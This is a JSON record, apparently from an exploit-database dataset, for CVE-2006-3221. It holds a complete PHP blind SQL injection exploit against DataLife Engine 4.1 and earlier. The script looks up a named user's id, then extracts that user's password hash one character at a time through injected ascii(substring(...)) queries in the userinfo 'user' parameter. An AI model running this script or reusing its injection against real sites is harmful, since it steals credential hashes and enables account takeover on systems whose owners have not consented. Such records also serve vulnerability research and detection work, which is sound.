{
  "id": "1939",
  "title": "DataLife Engine 4.1 - SQL Injection",
  "cve": "CVE-2006-3221",
  "vuln_type": "sqli",
  "code": "<?php\r\nerror_reporting (E_ERROR);\r\nini_set(\"max_execution_time\",0);\r\n\r\necho '\r\n+========================================+\r\n| RST/GHC Datalife SQL injection exploit |\r\n+========================================+\r\n<    >  Lite Version for DLE <=4.1  <    >\r\n';\r\n\r\nif ($argc < 2 ){\r\nprint \" Usage: \" . $argv[0] . \" <host> <user> [table prefix]\\n\";\r\nprint \" ex.: \" . $argv[0] . \" datalife.engine.net admin\\n\";\r\ncredits();\r\nexit;\r\n}\r\n\r\n//DEFINE USER ID\r\n$urla = 'http://' . $argv[1] . '/index.php?subaction=userinfo&user=' . $argv[2];\r\n$result = file_get_contents($urla);\r\n$str1 = 'user='; #index.php?do=pm&doaction=newpm&user=\r\n$position = strpos($result, $str1);\r\n\r\nif ($position === false){ print \"\\n\\rSorry, no match found for user \" . $argv[2]; credits();}\r\n$str2 = '\">';\r\n$pos = strpos($result, $str2, $position);\r\n$pos1 = $position+5;\r\n$user_id = intval(substr($result, $pos1, $pos-$pos1));\r\n\r\nprint \"Trying to get hash for password of user \". $argv[2] .\" with id=\" . $user_id . \":\\n\";\r\n\r\n//SOME defines (aka CONFIG =))\r\nif (empty($argv[3])){ $prefix = 'dle_';} #define prefix of the tables. try to find it yourself =) it is easy =)\r\nelse {$prefix = $argv[3];}\r\n$min = 48;  # 0\r\n$max = 122; # z\r\nif (check(\">$min\", 1) == 0 && check(\"<$max\", 1) == 0) {print \"\\n Site is unvulnerable...\"; credits();}\r\nfor ($sn=1; $sn <= 32; $sn++) {\r\n   blind($sn, $min, $max);\r\n}\r\ncredits();\r\n\r\n\r\n// REQUEST function\r\nfunction check($crcheck, $sn)\r\n{\r\n   global $argv, $user_id, $prefix;\r\n$host   = 'http://' . $argv[1] . '/index.php'; # argv[1] - host\r\n$name = $argv[2]; #user name\r\n$query  = '?subaction=userinfo&user=' . $name .'%2527%20and%20ascii(substring((SELECT%20password%20FROM%20' . $prefix. 'users%20WHERE%20user_id='. $user_id .'),' . $sn . ',1))' .$crcheck . '/*'; #\r\n\r\n$http = $host . $query;\r\n#DEBUG\r\n#print $http . \"\\n\";\r\n $result = file_get_contents($http);\r\n \r\n // checking the answer\r\n $string = ': '.$name.'</h2>'; #CORRECT it FOR your version, kids =)\r\n#good idea is: 'do=pm&doaction=newpm&user='.$user_id;\r\n \r\n   if (eregi($string, $result)) { return 1; }\r\n\r\n return 0;\r\n}\r\n\r\n//range function\r\nfunction blind($sn, $fmin, $fmax)\r\n{\r\n if (($fmax-$fmin)<5) { if (crack($fmin, $fmax, $sn) == 0){print \"\\n\\rEXPLOIT FAILED...\"; credits();} return;}\r\n $compare = intval($fmin + ($fmax-$fmin)/2);\r\n $crcheck = \">\". $compare;\r\n if ( check($crcheck, $sn) == 1 ) {\r\n    blind($sn, $compare, $fmax);\r\n    }\r\n else {\r\n    blind($sn, $fmin, $compare+1); }\r\n}\r\n\r\n//brute function\r\nfunction crack($cmin, $cmax, $sn)\r\n{\r\n for ($i=$cmin; $i <=$cmax; $i++){\r\n   $crcheck = \"=$i\";\r\n   if (check($crcheck, $sn) == 1){print chr($i); return 1;}\r\n }\r\nreturn 0;\r\n}\r\n\r\n\r\nfunction credits(){\r\nprint \"\\n\\n+========================================+\\n\\r Credits: 1dt.w0lf & foster \\n\\r Copyright (c) RST/GHC\";\r\nprint \"\\n\\r http://rst.void.ru && http://ghc.ru\\n\\r+========================================+\\n\";\r\nexit;\r\n}\r\n\r\n?>\r\n\r\n# milw0rm.com [2006-06-21]",
  "url": "https://www.exploit-db.com/exploits/1939"
}